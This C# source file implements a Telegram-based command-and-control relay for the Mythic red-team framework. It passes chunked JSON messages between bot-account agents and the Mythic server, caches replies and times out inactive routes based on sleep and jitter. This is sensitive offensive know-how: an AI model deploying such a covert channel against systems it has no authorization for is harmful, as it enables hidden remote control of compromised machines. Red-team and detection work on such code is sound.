using System.Collections.Concurrent;
using System.Text.Json;
using PushC2Services;

namespace TelegramC2;

internal sealed class TelegramServer : IDisposable
{
    private const int EnvelopeChunkSize = 2800;
    private const int MaximumCachedResponses = 16;
    private static readonly TimeSpan CachedResponseLifetime = TimeSpan.FromMinutes(10);
    private static readonly TimeSpan RouteCheckInterval = TimeSpan.FromSeconds(5);
    private readonly ServerConfig _config;
    private readonly TelegramApiClient _telegram;
    private readonly MythicClient _mythic;
    private readonly ChunkAssembler _assembler = new();
    private readonly ConcurrentDictionary<string, RouteState> _routes = new(StringComparer.Ordinal);

    public TelegramServer(ServerConfig config, TelegramApiClient telegram, MythicClient mythic)
    {
        _config = config;
        _telegram = telegram;
        _mythic = mythic;
        _mythic.MessageReceived += HandleMythicMessageAsync;
    }

    public async Task RunAsync(CancellationToken cancellationToken)
    {
        await _mythic.StartAsync(cancellationToken);
        Task routeMonitor = MonitorRoutesAsync(cancellationToken);
        try
        {
            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    IReadOnlyList<TelegramUpdate> updates = await _telegram.GetUpdatesAsync(
                        _config.PollTimeout,
                        cancellationToken);
                    foreach (TelegramUpdate update in updates)
                    {
                        await HandleTelegramUpdateAsync(update);
                    }
                }
                catch (OperationCanceledException) when (cancellationToken.IsCancellationRequested)
                {
                    break;
                }
                catch (Exception exception)
                {
                    Console.Error.WriteLine($"Telegram polling failed: {exception.Message}");
                    try
                    {
                        await Task.Delay(TimeSpan.FromSeconds(2), cancellationToken);
                    }
                    catch (OperationCanceledException) when (cancellationToken.IsCancellationRequested)
                    {
                        break;
                    }
                }
            }
        }
        finally
        {
            try
            {
                await routeMonitor;
            }
            catch (OperationCanceledException) when (cancellationToken.IsCancellationRequested)
            {
            }
        }
    }

    private async Task HandleTelegramUpdateAsync(TelegramUpdate update)
    {
        TelegramMessage? message = update.Message;
        if (message?.From?.IsBot != true ||
            message.Chat is null ||
            string.IsNullOrWhiteSpace(message.Text))
        {
            return;
        }

        TelegramEnvelope? envelope;
        try
        {
            envelope = JsonSerializer.Deserialize<TelegramEnvelope>(message.Text);
        }
        catch (JsonException)
        {
            return;
        }

        if (envelope is null ||
            envelope.Version != 1 ||
            !envelope.ToServer ||
            string.IsNullOrWhiteSpace(envelope.SenderId) ||
            string.IsNullOrWhiteSpace(envelope.PacketId))
        {
            return;
        }

        RouteState route = _routes.GetOrAdd(
            envelope.SenderId,
            _ => new RouteState(message.Chat.Id.ToString()));
        route.Refresh(
            message.Chat.Id.ToString(),
            envelope.SleepSeconds,
            envelope.JitterPercent);

        if (!_assembler.TryAdd(envelope.SenderId, envelope, out string assembled))
        {
            return;
        }

        CachedResponse? cachedResponse;
        bool shouldForward;
        lock (route.Sync)
        {
            route.RemoveExpiredResponses();
            if (route.Responses.TryGetValue(envelope.PacketId, out cachedResponse))
            {
                shouldForward = false;
            }
            else if (route.PendingPacketId is not null)
            {
                return;
            }
            else
            {
                route.PendingPacketId = envelope.PacketId;
                shouldForward = true;
            }
        }

        if (cachedResponse is not null)
        {
            await SendPayloadAsync(
                route.ChatId,
                envelope.SenderId,
                envelope.PacketId,
                cachedResponse.Payload,
                CancellationToken.None);
            return;
        }

        if (!shouldForward)
        {
            return;
        }

        try
        {
            await _mythic.SendAsync(envelope.SenderId, assembled);
        }
        catch
        {
            lock (route.Sync)
            {
                if (route.PendingPacketId == envelope.PacketId)
                {
                    route.PendingPacketId = null;
                }
            }
            throw;
        }
    }

    private async Task HandleMythicMessageAsync(PushC2MessageFromMythic message)
    {
        if (string.IsNullOrWhiteSpace(message.TrackingID) ||
            !_routes.TryGetValue(message.TrackingID, out RouteState? route))
        {
            return;
        }

        string? requestId;
        lock (route.Sync)
        {
            requestId = route.PendingPacketId;
            if (requestId is null)
            {
                return;
            }

            route.PendingPacketId = null;
            if (message.Success)
            {
                route.Responses[requestId] = new CachedResponse(message.Message.ToStringUtf8());
                route.TrimResponses();
            }
        }

        if (!message.Success)
        {
            Console.Error.WriteLine($"Mythic rejected a Telegram message: {message.Error}");
            return;
        }

        try
        {
            await SendPayloadAsync(
                route.ChatId,
                message.TrackingID,
                requestId,
                message.Message.ToStringUtf8(),
                CancellationToken.None);
        }
        catch (Exception exception)
        {
            Console.Error.WriteLine($"Failed to send a Telegram response: {exception.Message}");
        }
    }

    private async Task SendPayloadAsync(
        string chatId,
        string routeId,
        string requestId,
        string payload,
        CancellationToken cancellationToken)
    {
        string packetId = Guid.NewGuid().ToString("N");
        int chunks = Math.Max(1, (payload.Length + EnvelopeChunkSize - 1) / EnvelopeChunkSize);
        for (int index = 0; index < chunks; index++)
        {
            int offset = index * EnvelopeChunkSize;
            int length = Math.Min(EnvelopeChunkSize, payload.Length - offset);
            var envelope = new TelegramEnvelope
            {
                ClientId = routeId,
                ToServer = false,
                PacketId = packetId,
                ReplyToPacketId = requestId,
                Chunk = index,
                Chunks = chunks,
                Message = payload.Substring(offset, length)
            };

            await _telegram.SendTextAsync(
                chatId,
                JsonSerializer.Serialize(envelope),
                cancellationToken);
        }
    }

    private async Task MonitorRoutesAsync(CancellationToken cancellationToken)
    {
        using var timer = new PeriodicTimer(RouteCheckInterval);
        while (await timer.WaitForNextTickAsync(cancellationToken))
        {
            DateTimeOffset now = DateTimeOffset.UtcNow;
            foreach ((string routeId, RouteState route) in _routes.ToArray())
            {
                if (!route.IsExpired(now) ||
                    !_routes.TryRemove(routeId, out RouteState? removedRoute) ||
                    !ReferenceEquals(route, removedRoute))
                {
                    continue;
                }

                try
                {
                    await _mythic.DisconnectAsync(routeId);
                    Console.WriteLine($"Telegram route {routeId} became inactive.");
                }
                catch (Exception exception)
                {
                    Console.Error.WriteLine(
                        $"Failed to report inactive Telegram route {routeId}: {exception.Message}");
                    _routes.TryAdd(routeId, route);
                }
            }
        }
    }

    public void Dispose()
    {
        _mythic.MessageReceived -= HandleMythicMessageAsync;
    }

    private sealed class RouteState
    {
        public RouteState(string chatId)
        {
            ChatId = chatId;
            LastSeen = DateTimeOffset.UtcNow;
        }

        public object Sync { get; } = new();
        public string ChatId { get; private set; }
        public DateTimeOffset LastSeen { get; private set; }
        public TimeSpan DisconnectAfter { get; private set; } = TimeSpan.FromMinutes(5);
        public string? PendingPacketId { get; set; }
        public Dictionary<string, CachedResponse> Responses { get; } = new(StringComparer.Ordinal);

        public void Refresh(string chatId, int sleepSeconds, int jitterPercent)
        {
            lock (Sync)
            {
                ChatId = chatId;
                LastSeen = DateTimeOffset.UtcNow;
                double interval = Math.Max(1, sleepSeconds);
                double jitter = Math.Clamp(jitterPercent, 0, 100) / 100.0;
                double thresholdSeconds = interval * (1 + jitter) * 3 + 30;
                DisconnectAfter = TimeSpan.FromSeconds(Math.Max(60, thresholdSeconds));
            }
        }

        public bool IsExpired(DateTimeOffset now)
        {
            lock (Sync)
            {
                return now - LastSeen > DisconnectAfter;
            }
        }

        public void RemoveExpiredResponses()
        {
            DateTimeOffset cutoff = DateTimeOffset.UtcNow - CachedResponseLifetime;
            foreach (string requestId in Responses
                         .Where(item => item.Value.CreatedAt < cutoff)
                         .Select(item => item.Key)
                         .ToArray())
            {
                Responses.Remove(requestId);
            }
        }

        public void TrimResponses()
        {
            RemoveExpiredResponses();
            while (Responses.Count > MaximumCachedResponses)
            {
                string oldest = Responses.MinBy(item => item.Value.CreatedAt).Key;
                Responses.Remove(oldest);
            }
        }
    }

    private sealed class CachedResponse
    {
        public CachedResponse(string payload)
        {
            Payload = payload;
        }

        public string Payload { get; }
        public DateTimeOffset CreatedAt { get; } = DateTimeOffset.UtcNow;
    }
}
